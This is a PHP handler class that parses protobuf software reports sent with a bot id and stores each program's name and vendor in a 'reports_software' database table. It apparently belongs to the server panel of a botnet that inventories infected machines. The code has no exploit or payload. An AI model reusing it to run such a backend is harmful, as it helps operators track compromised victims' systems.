<?php

require_once 'ReportHandler.php';
require_once 'application/modules/protobuf/pb_proto_protocol.php';

class ReportSoftwareHandler extends ReportHandler
{
    public function grabDataFromProtobuf($input_data, $botid)
    {
        $reportSoftware = new reportSoftware();
        $reportSoftware->ParseFromString($input_data);
        $this->data = $reportSoftware->getAssocArray();
        $this->data['bot_id'] = $this->getRowIdByBotId($botid);
    }

    public function storeDataToServer()
    {
        try
        {
            if ($this->dataIsEmpty())
            {
                return false;
            }

            $this->getDB()->beginTransaction();

            foreach ($this->data['software'] as $software)
            {
                if ($software['vendor'] === NULL) $software['vendor'] = 'Unknown';
                if ($software['name'] === NULL) $software['name'] = 'Unknown';

                if (($software['name'] === 'Unknown' && $software['vendor'] === 'Unknown') ||
                        $this->rowIsExist($this->data['bot_id'], $software['name'], $software['vendor']))
                {
                    continue;
                }
                $this->getDB()->insert('reports_software', array('bot_id' => $this->data['bot_id'], 'name' => $software['name'], 'vendor' => $software['vendor']));
            }

            $this->getDB()->commit();
        }
        catch(Exception $e)
        {
            $this->getDB()->rollBack();
            Logger::Error('ReportSoftwareHandler', 'storeDataToServer (exception)', $e, null, json_encode($this->data));
            return false;
        }
        return true;
    }

    protected function dataIsEmpty()
    {
        if (empty($this->data['software']))
            return true;
        return false;
    }

    private function rowIsExist($botid, $name, $vendor)
    {
        return $this->getDB()->count('reports_software', 'bot_id=:bot_id AND name=:name AND vendor=:vendor',
            array(':bot_id' => $botid, ':name' => $name, ':vendor' => $vendor)) > 0;
    }
}